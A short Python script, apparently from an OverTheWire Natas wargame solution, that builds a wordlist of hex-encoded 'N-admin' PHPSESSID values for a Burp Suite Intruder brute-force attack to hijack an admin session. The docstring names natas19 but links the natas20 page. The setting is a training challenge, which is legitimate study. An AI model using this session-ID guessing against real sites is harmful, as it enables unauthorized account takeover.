'''
This is a script used for generating PHPSESSIDs to use in a Burp Suite intruder
attack for natas19 from http://overthewire.org/wargames/natas/natas20.html.
'''

string = ""

with open("PHPSESSIDs.txt", "w") as filey:

    for i in range(1,641):

        string += (str(i) + "-admin").encode("hex") + "\n"

    filey.write(string)
